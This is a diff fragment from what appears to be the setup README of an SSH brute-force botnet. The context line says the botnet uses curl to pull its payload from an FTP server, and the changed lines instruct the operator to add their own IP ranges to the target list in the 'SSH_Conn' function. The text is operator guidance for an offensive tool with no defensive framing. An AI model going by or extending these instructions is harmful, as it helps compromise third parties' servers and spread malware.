@@ -30,9 +30,9 @@ and login by Brute-force attack. This botnet use "curl" to get payload from FTP 
 		case var_name:
 				return ManageIP_range(ipRange, "")
 
-(3) Then go to The "SSH_Conn" function, And add your constant ip range to The slice name "NetArr".
+(3) Then go to The "SSH_Conn" function, And add your constant ip range to The slice name "NetList".
 
-		NetArr := []string{
+		NetList := []string{
 			chpn1, chpn2, chpn3, chpn4, chpn5, cgpn1, cgpn2, cgpn3,
 			cgpn4, cgpn5, cgpn6, var_name,
 		}
